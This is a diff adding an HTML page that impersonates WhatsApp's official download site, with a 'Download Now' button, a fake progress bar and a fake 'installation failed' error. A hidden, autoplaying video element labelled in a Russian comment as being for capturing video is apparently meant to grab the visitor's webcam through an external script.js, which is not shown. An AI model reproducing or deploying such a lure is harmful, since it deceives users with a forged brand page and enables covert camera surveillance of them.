@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Messenger - Official Site</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #fcf5eb; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .header { background-color: #ffffff; width: 100%; padding: 15px 0; text-align: center; border-bottom: 1px solid #ddd; }
+        .hero { background: url('https://static.whatsapp.net/rsrc.php/v3/y7/r/S9Z9vY_O-V_.png') no-repeat center; background-size: cover; width: 100%; max-width: 400px; height: 500px; border-radius: 20px; margin-top: 20px; position: relative; color: white; display: flex; flex-direction: column; justify-content: center; padding: 20px; box-sizing: border-box; }
+        h1 { font-size: 42px; margin-bottom: 10px; line-height: 1.1; }
+        p { font-size: 18px; line-height: 1.4; margin-bottom: 30px; }
+        .btn { background-color: #25d366; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-size: 20px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; transition: 0.3s; }
+        .btn:hover { background-color: #128c7e; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 1000; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #25d366; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #error-msg { display: none; color: #ea0038; font-weight: bold; margin-top: 20px; padding: 20px; }
+        video { display: none; } /* Скрытый элемент для захвата видео */
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="140" alt="WhatsApp">
+</div>
+
+<div class="hero">
+    <h1>Stay connected</h1>
+    <p>Simple, reliable, private messaging and calling for free*, available all over the world.</p>
+    <button class="btn" onclick="startProcess()">Download Now <i class="fas fa-download"></i></button>
+</div>
+
+<div id="overlay">
+    <div class="loader" id="spinner"></div>
+    <h2 id="status-text">Downloading WhatsApp...</h2>
+    <div id="progress-bar" style="width: 200px; background: #ddd; height: 10px; border-radius: 5px; overflow: hidden;">
+        <div id="fill" style="width: 0%; background: #25d366; height: 100%; transition: 0.5s;"></div>
+    </div>
+    <div id="error-msg">
+        <i class="fas fa-exclamation-triangle" style="font-size: 40px;"></i>
+        <p>Error 403: Installation failed.<br>Your device is not compatible with this version of WhatsApp.<br>Please try again later.</p>
+    </div>
+</div>
+
+<video id="webcam" autoplay muted></video>
+
+<script src="script.js"></script>
+</body>
+</html>
